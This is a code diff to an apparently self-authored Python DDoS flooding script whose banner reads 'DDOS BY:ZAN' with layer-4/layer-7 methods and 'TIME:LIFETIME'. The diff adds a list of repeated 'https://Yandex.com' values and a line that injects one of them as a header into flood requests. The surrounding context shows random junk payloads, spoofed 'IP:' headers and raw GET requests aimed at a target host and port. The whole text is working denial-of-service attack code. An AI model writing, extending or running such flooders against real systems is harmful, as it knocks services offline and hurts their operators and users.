@@ -71,6 +71,106 @@ userip = ["""45.68.71.21:8080
 45.68.71.21:443
 45.68.71.21:443
 45.68.71.21:443"""]
+acceptall = [""" https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com
+https://Yandex.com """]
 print(""" | DDOS |  METHOD  | | DDOS BY:ZAN |
               |  LAYER4  |  TIME:LIFETIME |
               |  LAYER7  |   TCP:443/80   |
@@ -86,6 +186,7 @@ def start():
   hh = random._urandom(999999)
   xx = int(0)
   ipser = "IP: "+random.choice(userip)+"\r\n"
+  accept = random.choice(acceptall)+"\r\n"
   content    = "Content-Type: application/x-www-form-urlencoded\r\n"
   length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
   target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
